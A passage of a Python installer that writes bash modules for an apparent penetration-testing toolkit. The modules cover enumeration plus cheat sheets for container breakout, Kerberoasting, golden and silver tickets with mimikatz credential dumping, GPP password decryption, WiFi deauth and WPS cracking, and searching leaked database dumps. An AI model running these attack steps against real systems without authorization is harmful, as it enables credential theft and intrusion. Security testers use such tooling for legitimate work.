  • WinPEAS
  • PowerUp.ps1
  • Sherlock.ps1
WIN_PRIVESC
}

airo_sudoexploit() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        privesc_usage "airo_sudoexploit"
        return 0
    fi
    local version="$(sudo --version 2>/dev/null | head -1 | grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+' || true)"
    
    if [[ -n "$version" ]]; then
        echo "[*] Sudo version: $version"
        echo "[*] Check exploits at: https://github.com/mzet-/linux-exploit-suggester"
    else
        echo "[-] Could not determine sudo version"
    fi
}

airo_kernelcheck() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        privesc_usage "airo_kernelcheck"
        return 0
    fi
    local kernel="$(uname -r 2>/dev/null || true)"
    if [[ -z "$kernel" ]]; then
        echo "[-] Unable to determine kernel version"
        return 1
    fi
    echo "[*] Kernel version: $kernel"
    echo "[*] Check for exploits:"
    echo "  searchsploit $kernel"
    echo "  or visit: https://www.exploit-db.com/search?q=${kernel}"
}

airo_winprivesc() {
    airo_wpe  # Alias to wpe function
}

airo_linprivesc() {
    airo_lpe  # Alias to lpe function
}

export -f airo_lpe airo_wpe airo_sudoexploit airo_kernelcheck
export -f airo_winprivesc airo_linprivesc airo_getpeas
'''
    
    (base_dir / "modules" / "privesc.sh").write_text(privesc_content, encoding='utf-8')
    (base_dir / "modules" / "privesc.sh").chmod(0o755)

def create_module_cloud(base_dir):
    """Create cloud module"""
    # Use raw string to avoid escape sequence warnings
    cloud_content = r'''#!/usr/bin/env bash
set -euo pipefail
# Cloud Security Module
# 8 cloud security commands

cloud_usage() {
    echo "Usage: $1 [--help]"
}

airo_awscheck() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        cloud_usage "airo_awscheck"
        return 0
    fi
    echo "[*] Checking AWS configuration..."
    
    if command -v aws >/dev/null 2>&1; then
        echo -e "\nAWS CLI Version:"
        aws --version 2>/dev/null || true
        
        echo -e "\nConfigured Profiles:"
        aws configure list-profiles 2>/dev/null || cat "$HOME/.aws/config" 2>/dev/null | grep "^\[profile" || echo "No profiles found"
        
        echo -e "\nCurrent Identity:"
        aws sts get-caller-identity 2>/dev/null || echo "Not authenticated"
    else
        echo "[-] AWS CLI not installed"
    fi
}

airo_azcheck() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        cloud_usage "airo_azcheck"
        return 0
    fi
    echo "[*] Checking Azure CLI configuration..."
    
    if command -v az >/dev/null 2>&1; then
        echo -e "\\nAzure CLI Version:"
        az version --output table 2>/dev/null || true
        
        echo -e "\\nLogged-in account:"
        az account show --output table 2>/dev/null || echo "Not authenticated"
    else
        echo "[-] Azure CLI (az) not installed"
    fi
}

airo_gcpcheck() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        cloud_usage "airo_gcpcheck"
        return 0
    fi
    echo "[*] Checking GCP CLI configuration..."
    
    if command -v gcloud >/dev/null 2>&1; then
        echo -e "\\nGCloud Version:"
        gcloud --version | head -5 || true
        
        echo -e "\\nActive config/account:"
        gcloud config list account --format 'value(core.account)' 2>/dev/null || echo "No active account"
        gcloud config list project --format 'value(core.project)' 2>/dev/null || echo "No project set"
    else
        echo "[-] Google Cloud CLI (gcloud) not installed"
    fi
}

airo_s3scan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_s3scan <bucket>"
        return 0
    fi
    local bucket="${1:?Usage: s3scan <bucket>}"
    
    echo "[*] Checking S3 bucket: $bucket"
    
    if command -v aws >/dev/null 2>&1; then
        aws s3 ls "s3://$bucket" 2>/dev/null || echo "[-] Unable to list bucket (permissions or not found)"
    else
        echo "[-] AWS CLI not installed"
    fi
}

airo_ec2scan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_ec2scan [region]"
        return 0
    fi
    local region="${1:-}"
    
    echo "[*] Listing EC2 instances${region:+ in $region}..."
    
    if command -v aws >/dev/null 2>&1; then
        if [[ -n "$region" ]]; then
            aws ec2 describe-instances --region "$region" --query 'Reservations[].Instances[].InstanceId' --output table 2>/dev/null || true
        else
            aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output table 2>/dev/null || true
        fi
    else
        echo "[-] AWS CLI not installed"
    fi
}

airo_dockerscan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        cloud_usage "airo_dockerscan"
        return 0
    fi
    echo "[*] Scanning Docker for misconfigurations..."
    
    if command -v docker >/dev/null 2>&1; then
        echo -e "\\nDocker Version:"
        docker --version || true
        
        echo -e "\\nRunning Containers:"
        docker ps 2>/dev/null || true
        
        echo -e "\\nAll Containers:"
        docker ps -a 2>/dev/null || true
        
        echo -e "\\nImages:"
        docker images 2>/dev/null || true
    else
        echo "[-] Docker not installed"
    fi
}

airo_kubescan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        cloud_usage "airo_kubescan"
        return 0
    fi
    echo "[*] Scanning Kubernetes cluster..."
    
    if command -v kubectl >/dev/null 2>&1; then
        echo -e "\\nKubernetes Version:"
        kubectl version --short 2>/dev/null || true
        
        echo -e "\\nNodes:"
        kubectl get nodes 2>/dev/null || true
        
        echo -e "\\nPods:"
        kubectl get pods --all-namespaces 2>/dev/null || true
    else
        echo "[-] kubectl not installed"
    fi
}

airo_containerbreak() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        cloud_usage "airo_containerbreak"
        return 0
    fi
    echo "[*] Container Breakout Techniques"
    
    cat << 'CONTAINER_BREAK'
1. Privileged Container:
   docker run --rm -it --privileged ubuntu bash
   # Inside container:
   fdisk -l
   mount /dev/sda1 /mnt

2. Docker Socket Mount:
   # If /var/run/docker.sock is mounted:
   apt-get update && apt-get install curl
   curl --unix-socket /var/run/docker.sock http://localhost/containers/json

3. Capabilities Abuse:
   # With SYS_ADMIN capability:
   mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

Tools:
  • amicontained
  • deepce
  • CDK (Container Detection Kit)
CONTAINER_BREAK
}

export -f airo_awscheck airo_azcheck airo_gcpcheck airo_s3scan airo_ec2scan
export -f airo_dockerscan airo_kubescan airo_containerbreak
'''
    
    (base_dir / "modules" / "cloud.sh").write_text(cloud_content, encoding='utf-8')
    (base_dir / "modules" / "cloud.sh").chmod(0o755)

def create_module_ad(base_dir):
    """Create Active Directory module"""
    # Use double backslashes to escape the backslashes in Windows paths
    ad_content = r'''#!/usr/bin/env bash
set -euo pipefail
# Active Directory Module
# 10 AD security commands

ad_usage() {
    echo "Usage: $1 [--help]"
}

airo_adusers() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_adusers <domain>"
        return 0
    fi
    local domain="${1:?Usage: adusers <domain>}"
    
    echo "[*] Enumerating AD users for: $domain"
    
    if command -v enum4linux >/dev/null 2>&1; then
        enum4linux -U "$domain" || true
    elif command -v ldapsearch >/dev/null 2>&1; then
        ldapsearch -x -h "$domain" -b "dc=$(echo "$domain" | sed 's/\\./,dc=/g')" "(objectClass=user)" 2>/dev/null | grep -i samaccountname || true
    else
        echo "[-] No AD enumeration tools found"
    fi
}

airo_adgroups() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_adgroups <domain>"
        return 0
    fi
    local domain="${1:?Usage: adgroups <domain>}"
    
    echo "[*] Enumerating AD groups for: $domain"
    
    if command -v enum4linux >/dev/null 2>&1; then
        enum4linux -G "$domain" || true
    else
        echo "[-] enum4linux not installed"
    fi
}

airo_admachines() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_admachines <domain>"
        return 0
    fi
    local domain="${1:?Usage: admachines <domain>}"
    
    echo "[*] Listing domain computers for: $domain"
    
    if command -v nmap >/dev/null 2>&1; then
        nmap -sS -p 445 --open "$domain/24" -oG - | grep Up | cut -d' ' -f2 || true
    else
        echo "[-] nmap not installed"
    fi
}

airo_bloodhound() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        ad_usage "airo_bloodhound"
        return 0
    fi
    echo "[*] BloodHound setup guide"
    
    cat << 'BLOODHOUND'
BloodHound Attack Path Analysis:

1. Data Collection:
   bloodhound-python -c All -u user -p pass -d domain -ns dc.domain.com

2. Start Neo4j:
   neo4j console
   Default: http://localhost:7474
   Default creds: neo4j/neo4j

3. Start BloodHound UI:
   bloodhound

4. Import data and analyze attack paths.
BLOODHOUND
}

airo_kerberoast() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_kerberoast <domain>"
        return 0
    fi
    local domain="${1:?Usage: kerberoast <domain>}"
    
    echo "[*] Kerberoasting attack on: $domain"
    
    cat << 'KERBEROAST'
Steps:

1. Enumerate SPNs:
   GetUserSPNs.py $domain/user:password -request

2. Request TGS tickets

3. Export tickets:
   mimikatz # kerberos::list /export

4. Crack with hashcat:
   hashcat -m 13100 hashes.txt wordlist.txt
KERBEROAST
}

airo_asreproast() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        ad_usage "airo_asreproast"
        return 0
    fi
    echo "[*] AS-REP Roasting attack"
    
    cat << 'ASREP'
Steps:

1. Find users with DONT_REQ_PREAUTH:
   GetNPUsers.py $domain/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast

2. Crack with hashcat:
   hashcat -m 18200 hashes.asreproast wordlist.txt
ASREP
}

airo_goldenticket() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        ad_usage "airo_goldenticket"
        return 0
    fi
    echo "[*] Golden Ticket Attack"
    
    cat << 'GOLDEN'
Requirements:
• krbtgt NTLM hash
• Domain SID

Mimikatz:
privilege::debug
sekurlsa::logonpasswords
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:$domain /sid:S-1-5-21-... /krbtgt:$hash /ptt
GOLDEN
}

airo_silverticket() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        ad_usage "airo_silverticket"
        return 0
    fi
    echo "[*] Silver Ticket Attack"
    
    cat << 'SILVER'
Requirements:
• Service account NTLM hash
• Target service SPN

Mimikatz:
kerberos::golden /user:Administrator /domain:$domain /sid:$SID /target:server.$domain /service:HTTP /rc4:$hash /ptt
SILVER
}

airo_passpol() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_passpol <domain>"
        return 0
    fi
    local domain="${1:?Usage: passpol <domain>}"
    
    echo "[*] Checking password policy for: $domain"
    
    if command -v crackmapexec >/dev/null 2>&1; then
        crackmapexec smb "$domain" --pass-pol || true
    elif command -v enum4linux >/dev/null 2>&1; then
        enum4linux -P "$domain" || true
    else
        echo "[-] No tools available"
    fi
}

airo_gpppass() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        ad_usage "airo_gpppass"
        return 0
    fi
    echo "[*] Extracting GPP passwords..."
    
    cat << 'GPP'
Group Policy Preferences Passwords:

1. Find GPP files:
   find / -name "Groups.xml" 2>/dev/null
   smbclient -L //$target -U ""%"" -c 'recurse;ls'

2. Decrypt passwords:
   gpp-decrypt $encrypted_password

3. Common locations:
   \\$domain\SYSVOL\$domain\Policies\{Policy-GUID}\Machine\Preferences\Groups
   \\$domain\SYSVOL\$domain\Policies\{Policy-GUID}\User\Preferences\Groups
GPP
}

export -f airo_adusers airo_adgroups airo_admachines airo_bloodhound airo_kerberoast
export -f airo_asreproast airo_goldenticket airo_silverticket airo_passpol airo_gpppass
'''
    
    (base_dir / "modules" / "ad.sh").write_text(ad_content, encoding='utf-8')
    (base_dir / "modules" / "ad.sh").chmod(0o755)

def create_module_wireless(base_dir):
    """Create wireless module"""
    wireless_content = '''#!/usr/bin/env bash
set -euo pipefail
# Wireless Security Module
# 8 wireless security commands

wireless_usage() {
    echo "Usage: $1 [--help]"
}

airo_wifiscan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        wireless_usage "airo_wifiscan"
        return 0
    fi
    echo "[*] Scanning for WiFi networks..."
    
    if command -v iwconfig >/dev/null 2>&1; then
        iwconfig 2>/dev/null | grep -i essid || true
    fi
    
    if command -v nmcli >/dev/null 2>&1; then
        nmcli dev wifi || true
    fi
    
    echo "[!] For detailed scanning, use: sudo airodump-ng wlan0mon"
}

airo_wifiattack() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_wifiattack <BSSID>"
        return 0
    fi
    local bssid="${1:?Usage: wifiattack <BSSID>}"
    
    echo "[*] WiFi Attack Menu - Target: $bssid"
    
    cat << 'WIFI_ATTACK'
1. Deauth Attack:
   aireplay-ng -0 10 -a $bssid wlan0mon

2. Capture Handshake:
   airodump-ng -c <channel> --bssid $bssid -w capture wlan0mon
   # Then deauth to capture handshake

3. WPS Attack:
   reaver -i wlan0mon -b $bssid -vv

Tools:
  • aircrack-ng suite
  • hashcat (for WPA cracking)
  • hcxtools
WIFI_ATTACK
}

airo_bluescan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        wireless_usage "airo_bluescan"
        return 0
    fi
    echo "[*] Scanning for Bluetooth devices..."
    
    if command -v hcitool >/dev/null 2>&1; then
        hcitool scan || true
    elif command -v bluetoothctl >/dev/null 2>&1; then
        echo "scan on" | bluetoothctl || true
        sleep 5
        echo "devices" | bluetoothctl || true
        echo "scan off" | bluetoothctl || true
    else
        echo "[-] Bluetooth tools not installed"
    fi
}

airo_blueattack() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_blueattack <BD_ADDR>"
        return 0
    fi
    local bdaddr="${1:?Usage: blueattack <BD_ADDR>}"
    
    echo "[*] Bluetooth Attack Menu - Target: $bdaddr"
    
    cat << 'BLUE_ATTACK'
1. Information:
   hcitool info $bdaddr

2. L2CAP Ping:
   l2ping $bdaddr

3. RFCOMM Scan:
   sdptool browse $bdaddr

4. SDP Browsing:
   sdptool records $bdaddr

Tools:
  • bluelog
  • bluesnarfer
  • spooftooph
  • gatttool
BLUE_ATTACK
}

airo_wpscrack() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_wpscrack <BSSID>"
        return 0
    fi
    local bssid="${1:?Usage: wpscrack <BSSID>}"
    
    echo "[*] WPS PIN cracking: $bssid"
    
    if command -v reaver >/dev/null 2>&1; then
        echo "reaver -i wlan0mon -b $bssid -vv -K 1"
        echo "bully -b $bssid wlan0mon"
    else
        echo "[-] reaver not installed"
    fi
}

airo_handshake() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_handshake <BSSID>"
        return 0
    fi
    local bssid="${1:?Usage: handshake <BSSID>}"
    
    echo "[*] Capture WPA Handshake Guide"
    
    cat << 'HANDSHAKE'
Steps:

1. Start monitoring:
   airmon-ng start wlan0
   airodump-ng wlan0mon

2. Capture on specific channel:
   airodump-ng -c <channel> --bssid $bssid -w capture wlan0mon

3. Deauth to capture handshake:
   aireplay-ng -0 4 -a $bssid -c <client_mac> wlan0mon

4. Crack with hashcat:
   hcxpcapngtool -o hash.hc22000 capture*.cap
   hashcat -m 22000 hash.hc22000 wordlist.txt
HANDSHAKE
}

airo_pmkidattack() {
    echo "[*] PMKID Attack Guide"
    
    cat << 'PMKID'
Advantages:
• No clients needed
• No deauth required
• Faster than handshake

Steps:

1. Capture PMKID:
   hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

2. Convert to hash format:
   hcxpcaptool -z hashes.txt capture.pcapng

3. Crack with hashcat:
   hashcat -m 16800 hashes.txt wordlist.txt

Tools:
  • hcxtools
  • hcxdumptool
  • hashcat (mode 16800)
PMKID
}

airo_rfscan() {
    echo "[*] RF Spectrum scanning guide"
    
    cat << 'RF_SCAN'
RF Scanning Tools:

Software Defined Radio:
  • rtl_power -f 24M:1700M -g 50 -i 5m survey.csv
  • gqrx
  • gnuradio-companion

Common Frequencies:
  • 433 MHz - Key fobs, sensors
  • 868 MHz - EU devices
  • 915 MHz - US devices
  • 2.4 GHz - WiFi, Bluetooth
  • 5.8 GHz - WiFi, drones

Hardware:
  • RTL-SDR
  • HackRF One
  • LimeSDR
  • USRP
RF_SCAN
}

export -f airo_wifiscan airo_wifiattack airo_bluescan airo_blueattack airo_wpscrack
export -f airo_handshake airo_pmkidattack airo_rfscan
'''
    
    (base_dir / "modules" / "wireless.sh").write_text(wireless_content, encoding='utf-8')
    (base_dir / "modules" / "wireless.sh").chmod(0o755)

def create_module_mobile(base_dir):
    """Create mobile/IoT module"""
    mobile_content = '''#!/usr/bin/env bash
set -euo pipefail
# Mobile & IoT Security Module
# 7 mobile/IoT security commands

mobile_usage() {
    echo "Usage: $1 [--help]"
}

airo_apkanalyze() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_apkanalyze <path/to/app.apk>"
        return 0
    fi
    local apk="${1:?Usage: apkanalyze <path/to/app.apk>}"
    
    if [[ ! -f "$apk" ]]; then
        echo "[-] File not found: $apk"
        return 1
    fi
    
    echo "[*] Analyzing APK: $apk"
    
    if command -v apktool >/dev/null 2>&1; then
        echo -e "\\nDecompiling APK:"
        if apktool d "$apk" -o apk_output 2>/dev/null; then
            echo "[+] Decompiled to apk_output/"
        else
            echo "[-] apktool failed"
        fi
    fi
    
    if command -v jadx >/dev/null 2>&1; then
        echo -e "\\nDecompiling to Java:"
        if jadx "$apk" -d jadx_output 2>/dev/null; then
            echo "[+] Java source in jadx_output/"
        else
            echo "[-] jadx failed"
        fi
    fi
    
    echo -e "\\nExtracting contents:"
    if command -v unzip >/dev/null 2>&1; then
        unzip -l "$apk" | head -20 || true
    else
        echo "[-] unzip not installed"
    fi
}

airo_apkdecompile() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_apkdecompile <path/to/app.apk> [outdir]"
        return 0
    fi
    local apk="${1:?Usage: apkdecompile <path/to/app.apk> [outdir] }"
    local outdir="${2:-apk_decompiled}"
    
    if [[ ! -f "$apk" ]]; then
        echo "[-] File not found: $apk"
        return 1
    fi
    
    mkdir -p "$outdir"
    echo "[*] Decompiling APK to $outdir"
    if command -v apktool >/dev/null 2>&1; then
        if apktool d "$apk" -o "$outdir/apktool" >/dev/null; then
            echo "[+] apktool output: $outdir/apktool"
        else
            echo "[-] apktool failed"
        fi
    else
        echo "[-] apktool not installed"
    fi
    
    if command -v jadx >/dev/null 2>&1; then
        if jadx "$apk" -d "$outdir/jadx" >/dev/null; then
            echo "[+] jadx output: $outdir/jadx"
        else
            echo "[-] jadx failed"
        fi
    else
        echo "[-] jadx not installed"
    fi
}

airo_ipascan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_ipascan <ip_address>"
        return 0
    fi
    local ip="${1:?Usage: ipascan <ip_address>}"
    
    echo "[*] Scanning iOS app backend: $ip"
    echo "[*] Running port scan..."
    # Would call portscan function
    echo "[*] Check for common iOS backend services"
}

airo_androidscan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_androidscan <ip_address>"
        return 0
    fi
    local ip="${1:?Usage: androidscan <ip_address>}"
    
    echo "[*] Scanning Android app backend: $ip"
    echo "[*] Running port scan..."
    # Would call portscan function
    echo "[*] Check for common Android backend services"
}

airo_iotscan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_iotscan <ip_address>"
        return 0
    fi
    local ip="${1:?Usage: iotscan <ip_address>}"
    
    echo "[*] Scanning IoT device: $ip"
    
    # Common IoT ports
    local iot_ports="21,22,23,80,81,443,554,8000,8080,8081,8443,8888,9000,49152"
    
    if command -v nmap >/dev/null 2>&1; then
        nmap -sS -p "$iot_ports" "$ip" || true
    else
        echo "[-] nmap not installed"
    fi
    
    echo -e "\\nCommon IoT vulnerabilities:"
    echo "• Default credentials (admin/admin)"
    echo "• Unencrypted services"
    echo "• Outdated firmware"
    echo "• Exposed debug interfaces"
}

airo_firmwareextract() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_firmwareextract <firmware_file>"
        return 0
    fi
    local firmware="${1:?Usage: firmwareextract <firmware_file>}"
    
    if [[ ! -f "$firmware" ]]; then
        echo "[-] File not found: $firmware"
        return 1
    fi
    
    echo "[*] Extracting firmware: $firmware"
    
    if command -v binwalk >/dev/null 2>&1; then
        binwalk -e "$firmware" || echo "[-] binwalk failed"
    elif command -v foremost >/dev/null 2>&1; then
        foremost -i "$firmware" -o firmware_extracted || echo "[-] foremost failed"
    else
        echo "[-] No extraction tools found"
    fi
}

airo_bleenum() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        mobile_usage "airo_bleenum"
        return 0
    fi
    echo "[*] Bluetooth Low Energy enumeration guide"
    
    cat << 'BLE_ENUM'
BLE Enumeration Tools:

1. Scan for devices:
   hcitool lescan
   bluetoothctl scan le

2. Connect and explore:
   gatttool -b $BD_ADDR -I
   connect
   primary
   characteristics

3. Read/write characteristics:
   char-read-hnd 0x000c
   char-write-req 0x000c 0100

Tools:
  • bettercap
  • crackle (BLE encryption crack)
  • gattacker
  • bluepy (Python library)

Common BLE Services:
  • 1800 - Device Information
  • 180A - Manufacturer Data
  • 180F - Battery Service
  • 1811 - Alert Notification
BLE_ENUM
}

export -f airo_apkanalyze airo_ipascan airo_androidscan airo_iotscan
export -f airo_apkdecompile airo_firmwareextract airo_bleenum
'''
    
    (base_dir / "modules" / "mobile.sh").write_text(mobile_content, encoding='utf-8')
    (base_dir / "modules" / "mobile.sh").chmod(0o755)

def create_module_osint(base_dir):
    """Create OSINT module"""
    osint_content = '''#!/usr/bin/env bash
set -euo pipefail
# OSINT Module
# 8 OSINT commands

osint_usage() {
    echo "Usage: $1 [--help]"
}

airo_emailosint() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_emailosint <email_address>"
        return 0
    fi
    local email="${1:?Usage: emailosint <email_address>}"
    
    echo "[*] OSINT for email: $email"
    
    cat << 'EMAIL_OSINT'
OSINT Sources:

1. Breach Databases:
   • Have I Been Pwned: https://haveibeenpwned.com
   • DeHashed (requires account)
   • WeLeakInfo

2. Social Media:
   • Facebook: https://www.facebook.com/search/top/?q=$email
   • Twitter: https://twitter.com/search?q=$email
   • LinkedIn: https://www.linkedin.com/search/results/all/?keywords=$email

3. Search Engines:
   • Google: "$email"
   • Bing: "$email"
   • DuckDuckGo: "$email"

4. Specialized Tools:
   • hunter.io (email finder)
   • clearbit.com
   • phonebook.cz
EMAIL_OSINT
}

airo_userosint() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_userosint <username>"
        return 0
    fi
    local username="${1:?Usage: userosint <username>}"
    
    echo "[*] OSINT for username: $username"
    
    cat << 'USER_OSINT'
Username OSINT Sources:

1. Social Media:
   • Instagram: https://www.instagram.com/$username/
   • Twitter: https://twitter.com/$username
   • GitHub: https://github.com/$username
   • Reddit: https://www.reddit.com/user/$username

2. Search Engines:
   • Google: "$username"
   • User search: whatsmyname.app
   • Namechk: namechk.com

3. Tools:
   • sherlock: sherlock $username
   • maigret: maigret $username
   • social-analyzer
USER_OSINT
}

airo_phoneosint() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_phoneosint <phone_number>"
        return 0
    fi
    local phone="${1:?Usage: phoneosint <phone_number>}"
    
    echo "[*] OSINT for phone: $phone"
    
    cat << 'PHONE_OSINT'
Phone Number OSINT:

1. Carrier Lookup:
   • truecaller.com
   • whitepages.com
   • carrier lookup APIs

2. Social Media:
   • Facebook phone search
   • WhatsApp number check
   • Telegram number search

3. Search Engines:
   • Google: "$phone"
   • Bing: "$phone"

4. Tools:
   • phoneinfoga
   • osintframework.com/phone
   • maigret (phone option)
PHONE_OSINT
}

airo_domainosint() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_domainosint <domain>"
        return 0
    fi
    local domain="${1:?Usage: domainosint <domain>}"
    
    echo "[*] Full domain OSINT: $domain"
    
    cat << 'DOMAIN_OSINT'
Domain OSINT Checklist:

1. WHOIS Lookup:
   whois $domain
   whois.domaintools.com/$domain

2. DNS Records:
   dig $domain ANY
   dnsdumpster.com
   securitytrails.com

3. Subdomains:
   sublist3r -d $domain
   assetfinder --subs-only $domain
   crt.sh for certificate transparency

4. Historical Data:
   archive.org/web/ (Wayback Machine)
   urlscan.io
   viewdns.info
DOMAIN_OSINT
}

airo_breachcheck() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_breachcheck <email>"
        return 0
    fi
    local email="${1:?Usage: breachcheck <email>}"
    
    echo "[*] Checking breaches for: $email"
    
    if command -v haveibeenpwned >/dev/null 2>&1; then
        haveibeenpwned --email "$email" || true
    else
        echo "[!] Install haveibeenpwned: pip3 install haveibeenpwned"
        echo "[!] Or check manually: https://haveibeenpwned.com"
    fi
}

airo_leaksearch() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_leaksearch <search_term>"
        return 0
    fi
    local term="${1:?Usage: leaksearch <search_term>}"
    
    echo "[*] Searching leaked databases for: $term"
    
    cat << 'LEAK_SEARCH'
Leaked Database Search:

1. Search Engines:
   • Google: "site:pastebin.com $term"
   • "filetype:sql $term"
   • "database dump $term"

2. Paste Sites:
   • pastebin.com
   • ghostbin.com
   • justpaste.it

3. Commands:
   • grep -r "$term" leak_downloads/
   • Use torrent search for "database dump"
LEAK_SEARCH
}

airo_metadata() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_metadata <file>"
        return 0
    fi
    local file="${1:?Usage: metadata <file>}"
    
    if [[ ! -f "$file" ]]; then
        echo "[-] File not found: $file"
        return 1
    fi
    
    echo "[*] Extracting metadata from: $file"
    
    if command -v exiftool >/dev/null 2>&1; then
        exiftool "$file" || true
    elif command -v file >/dev/null 2>&1; then
        file "$file" || true
        if command -v strings >/dev/null 2>&1; then
            strings "$file" | head -50 || true
        else
            echo "[-] strings not installed"
        fi
    else
        echo "[-] exiftool not installed"
    fi
}

airo_imageosint() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        osint_usage "airo_imageosint"
        return 0
    fi
    echo "[*] Reverse image search guide"
    
    cat << 'IMAGE_OSINT'
Reverse Image Search:

1. Search Engines:
   • Google Images: https://images.google.com
   • Bing Images: https://www.bing.com/images
   • Yandex Images: https://yandex.com/images

2. Specialized Sites:
   • TinEye: https://tineye.com
   • Pimeyes: https://pimeyes.com
   • Berify: https://berify.com

3. Commands:
   • If file: curl -F "file=@$image" https://tineye.com
   • If URL: open browser with image URL
IMAGE_OSINT
}

export -f airo_emailosint airo_userosint airo_phoneosint airo_domainosint
export -f airo_breachcheck airo_leaksearch airo_metadata airo_imageosint
'''
    
    (base_dir / "modules" / "osint.sh").write_text(osint_content, encoding='utf-8')
    (base_dir / "modules" / "osint.sh").chmod(0o755)

def create_module_automation(base_dir):
    """Create automation module"""
    automation_content = '''#!/usr/bin/env bash
set -euo pipefail
# Automation Module
# 7 automation commands

run_with_grc() {
    if command -v grc >/dev/null 2>&1; then
        grc "$@"
    else
        "$@"
    fi
}

automation_usage() {
    echo "Usage: $1 [--help]"
}

airo_reconall() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_reconall <domain> [--out <dir>] [--target <domain>] [--nmap-opts \"...\"]"
        return 0
    fi
    local out_override=""
    local target_override=""
    local nmap_opts=""
    if ! PARSED=$(getopt -o h --long out:,target:,nmap-opts:,help -- "$@"); then
        echo "Usage: airo_reconall <domain> [--out <dir>] [--target <domain>] [--nmap-opts \"...\"]"
        return 1
    fi
    eval set -- "$PARSED"
    while true; do
        case "$1" in
            --out) out_override="$2"; shift 2 ;;
            --target) target_override="$2"; shift 2 ;;
            --nmap-opts) nmap_opts="$2"; shift 2 ;;
            -h|--help) echo "Usage: airo_reconall <domain> [--out <dir>] [--target <domain>] [--nmap-opts \"...\"]"; return 0 ;;
            --) shift; break ;;
            *) break ;;
        esac
    done
    local domain="${target_override:-${1:?Usage: reconall <domain> [--out <dir>] [--target <domain>] [--nmap-opts \"...\"]}}"
    
    echo "[*] Starting full reconnaissance on: $domain"
    
    # Create output directory
    local output_dir="${out_override:-$HOME/recon/$domain-$(date +%Y%m%d)}"
    mkdir -p "$output_dir"
    
    echo "[+] Output directory: $output_dir"
    
    # Subdomain enumeration
    echo "[+] Enumerating subdomains..."
    if command -v subfinder >/dev/null 2>&1; then
        subfinder -d "$domain" -o "$output_dir/subdomains.txt" || true
    fi
    
    # DNS reconnaissance
    echo "[+] DNS reconnaissance..."
    if command -v dig >/dev/null 2>&1; then
        dig "$domain" ANY +noall +answer > "$output_dir/dns_any.txt" || true
    else
        echo "[-] dig not installed; skipping DNS ANY lookup"
    fi
    
    # Port scanning
    echo "[+] Port scanning..."
    if command -v nmap >/dev/null 2>&1; then
        if [[ -n "$nmap_opts" ]]; then
            read -r -a nmap_opts_arr <<< "$nmap_opts"
            { run_with_grc nmap "${nmap_opts_arr[@]}" "$domain" -oN "$output_dir/nmap_quick.txt" || true; } &
        else
            { run_with_grc nmap -sS "$domain" -oN "$output_dir/nmap_quick.txt" || true; } &
        fi
    fi
    
    # Web reconnaissance
